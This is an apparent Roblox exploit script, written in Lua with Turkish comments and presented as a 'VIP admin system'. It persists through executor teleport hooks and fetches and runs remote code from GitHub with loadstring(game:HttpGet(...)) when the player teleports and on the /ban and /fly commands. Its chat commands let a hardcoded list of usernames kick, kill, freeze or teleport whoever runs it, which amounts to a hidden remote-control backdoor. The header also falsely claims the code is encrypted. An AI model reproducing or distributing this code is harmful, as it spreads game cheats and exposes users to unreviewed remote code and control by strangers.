--[[ akllı vip admin sistem
Komutlar: 
/fly
/bring
/loopbring
/_clear
/kill
/kick
/decal
/undecal
/antifling
/spin
/unspin
/ban     opsiyonel

Özellikler:
Yönetici yazısı kalktı
artık kalıcı bir script

....................................................................................................................
/$$   /$$ /$$ /$$           /$$       /$$      /$$                                   /$$                          
| $$  | $$|/| $$          | $$      | $$  /$ | $$                                  | $$                          
| $$  | $$ /$$| $$  /$$$$$$ | $$      | $$ /$$$| $$  /$$$$$$   /$$$$$$   /$$$$$$     | $$       /$$   /$$  /$$$$$$ 
| $$$$$$$$| $$| $$ |____  $$| $$      | $$/$$ $$ $$ |____  $$ /$$__  $$ /$$__  $$    | $$      | $$  | $$ |____  $$
| $$__  $$| $$| $$  /$$$$$$$| $$      | $$$$_  $$$$  /$$$$$$$| $$  \/| $$$$$$$$    | $$      | $$  | $$  /$$$$$$$
| $$  | $$| $$| $$ /$$__  $$| $$      | $$$/ \  $$$ /$$__  $$| $$      | $$/    | $$      | $$  | $$ /$$_  $$
| $$  | $$| $$| $$|  $$$$$$$| $$      | $$/   \  $$|  $$$$$$$| $$      |  $$$$$$$ /$$| $$$$$$$$|  $$$$$$/|  $$$$$$$
|/  |/|/|/ \/|/      |/     \/ \/|/       \/|/|/ \/  \/
.....................................................................................................................



Bu scipt Tamamen Şifrelenmiş Ve 16.07.2021 tarihinde yapılıp 16.07.2025 tarihinde yayınlanmıştır.
Kod Tamamen Şifrelenmiştir. Lüffen Kodu Değiştirmeyin.
Kod değiştirilirse Sorumluluk kabul edilmez.
Yani kusura bakmayın ayrıca kodda bypass olmasına rağmen kod yüzünden ban yemeniz benim suçum değil amk.
Bu kodu zamandan tasarruf etmek için yazdım.
OE lik yapmayın.
Sitemiz: HilalWare.netlify.com
Tiktok: OyuncuYesOfficial
Sizi sitemize ve Tiktok a bekleriz.
İyi günler dileriz.
Ve kullandığınız için teşekkür ederiz.

]] 

-- Tekrar Çalış 

-- Tekrar Çalıştırma Sistemi
local teleportFonk = (syn and syn.queue_on_teleport) or queue_on_teleport

if teleportFonk then
    teleportFonk([[
        print("Sistem yeniden yükleniyor... v 0.001")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/adam-ak-ll-ism-yok/refs/heads/main/admin%20gui.lua",true))()
    ]])
end

-- Servisler
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")

-- Değişkenler
local LocalPlayer = Players.LocalPlayer

-- Yetkililer
local allowedUsers = {
    ["q692q"] = true,
    ["q2_0a"] = true,
    ["muhammet_bekir2004"] = true,
    ["HilalWare_Lua"] = true,
    ["Muhammet_bekir2003"] = true,
    ["ultramegac00ladmin"] = true
}

local frozen = false
local loopBring = false
local loopTarget = nil
local originalSky = nil
local spinning = false
local spinSpeed = 10

-- Karakterin tüm parçalarını dondur / çöz
local function setAnchoredAllParts(char, anchored)
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Anchored = anchored
        end
    end
end

-- Spin fonksiyonu
local function startSpinning(speed)
    spinning = true
    spinSpeed = speed or 10
    
    spawn(function()
        while spinning and LocalPlayer.Character do
            local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
            end
            RunService.Heartbeat:Wait()
        end
    end)
end

local function stopSpinning()
    spinning = false
end

-- Decal fonksiyonu
local function applyDecalToAllParts()
    local decalId = "86841996432802"
    
    -- Orijinal sky'i kaydet (sadece ilk sefer)
    if not originalSky then
        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") then
                originalSky = obj:Clone()
                break
            end
        end
    end
    
    -- Workspace'teki tüm parçalara decal uygula
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            -- Önce eski decalları temizle
            for _, child in ipairs(obj:GetChildren()) do
                if child:IsA("Decal") and child.Name == "HilalWareDecal" then
                    child:Destroy()
                end
            end
            
            -- 6 yüzeyin tamamına decal uygula
            local faces = {"Front", "Back", "Left", "Right", "Top", "Bottom"}
            for _, face in ipairs(faces) do
                local decal = Instance.new("Decal")
                decal.Name = "HilalWareDecal"
                decal.Texture = "http://www.roblox.com/asset/?id=" .. decalId
                decal.Face = Enum.NormalId[face]
                decal.Parent = obj
            end
        end
    end
    
    -- Sky'i değiştir
    for _, obj in ipairs(Lighting:GetChildren()) do
        if obj:IsA("Sky") then
            obj:Destroy()
        end
    end
    
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. decalId
    sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. decalId
    sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. decalId
    sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. decalId
    sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. decalId
    sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. decalId
    sky.Parent = Lighting
end
-- Undecal fonksiyonu
local function removeDecalFromAllParts()
    -- Workspace'teki tüm HilalWare decalları temizle
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            for _, child in ipairs(obj:GetChildren()) do
                if child:IsA("Decal") and child.Name == "HilalWareDecal" then
                    child:Destroy()
                end
            end
        end
    end
    
    -- Orijinal sky'i geri yükle veya default sky yükle
    if originalSky then
        -- Mevcut tüm sky'leri temizle
        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") then
                obj:Destroy()
            end
        end
        -- Orijinal sky'i geri yükle
        originalSky:Clone().Parent = Lighting
    else
        -- Orijinal sky kaydedilmemişse, default sky yükle
        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") then
                obj:Destroy()
            end
        end
        -- Roblox default sky'ini yükle
        local defaultSky = Instance.new("Sky")
        defaultSky.Name = "DefaultSky"
        defaultSky.Parent = Lighting
    end
end

-- Clear fonksiyonu (oyuncular hariç herşeyi sil)
local function clearWorkspace()
    for _, obj in ipairs(workspace:GetChildren()) do
        if not obj:IsA("Model") or not Players:GetPlayerFromCharacter(obj) then
            if not obj:IsA("Terrain") then
                obj:Destroy()
            end
        end
    end
end

-- LoopBring sistemi
spawn(function()
    while true do
        if loopBring and loopTarget and loopTarget.Character and loopTarget.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character.HumanoidRootPart.CFrame = loopTarget.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
        end
        RunService.Heartbeat:Wait()
    end
end)

-- Komutlar
local function setupCommands(player)
    player.Chatted:Connect(function(message)
        local msg = string.lower(message)
        
        -- Kullanıcı yetkili mi kontrol et
        if not allowedUsers[player.Name] then
            return
        end
        
        -- /kick komutu
        if string.sub(msg, 1, 6) == "/kick " then
            local reason = string.sub(message, 7)
            if reason and reason ~= "" then
                LocalPlayer:Kick("Yetkili tarafından atıldınız. Sebep: " .. reason)
            else
                LocalPlayer:Kick("Yetkili tarafından atıldınız!")
            end

        elseif msg == "/kick" then
            LocalPlayer:Kick("Yetkili tarafından atıldınız!")

        elseif msg == "/ban" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/adam-ak-ll-ism-yok/refs/heads/main/bana.lua",true))()

        -- /spin komutu
        elseif string.sub(msg, 1, 6) == "/spin " then
            local speed = tonumber(string.sub(message, 7))
            if speed and speed > 0 then
                startSpinning(speed)
            else
                startSpinning(10)
            end

        elseif msg == "/spin" then
            startSpinning(10)

        -- /unspin komutu
        elseif msg == "/unspin" then
            stopSpinning()

        -- /decal komutu
        elseif msg == "/decal" then
            applyDecalToAllParts()
                
        -- /undecal komutu
        elseif msg == "/undecal" then
            removeDecalFromAllParts()

        -- /clear komutu
        elseif msg == "/clear" then
            clearWorkspace()

        elseif msg == "/kill" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = 0
            end

        elseif msg == "/freeze" then
            if LocalPlayer.Character then
                frozen = true
                setAnchoredAllParts(LocalPlayer.Character, true)
            end

        elseif msg == "/unfreeze" then
            if LocalPlayer.Character then
                frozen = false
                setAnchoredAllParts(LocalPlayer.Character, false)
            end

        elseif msg == "/bring" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            end

        elseif msg == "/loopbring" then
            loopBring = true
            loopTarget = player

        elseif msg == "/unloopbring" then
            loopBring = false
            loopTarget = nil

        elseif msg == "/fly" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly"))()

        elseif msg == "/antifling" then
            local function makeNoCollide(character)
                for _, part in ipairs(character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end

            local function onPlayerAdded(plr)
                plr.CharacterAdded:Connect(function(character)
                    makeNoCollide(character)
                end)
            end

            for _, p in ipairs(Players:GetPlayers()) do
                onPlayerAdded(p)
                if p.Character then
                    makeNoCollide(p.Character)
                end
            end

            Players.PlayerAdded:Connect(onPlayerAdded)

            spawn(function()
                while true do
                    for _, p in ipairs(Players:GetPlayers()) do
                        if p.Character then
                            makeNoCollide(p.Character)
                        end
                    end
                    RunService.Heartbeat:Wait()
                end
            end)
        end
    end)
end

-- Sistem başlatma
print("Akıllı VIP Admin Sistemi yüklendi! v 0.001")

-- Mevcut yetkili oyunculara komutları kur
for _, player in ipairs(Players:GetPlayers()) do
    if allowedUsers[player.Name] then
        setupCommands(player)
    end
end

-- Yeni gelen yetkili oyunculara komutları kur
Players.PlayerAdded:Connect(function(player)
    if allowedUsers[player.Name] then
        setupCommands(player)
    end
end)
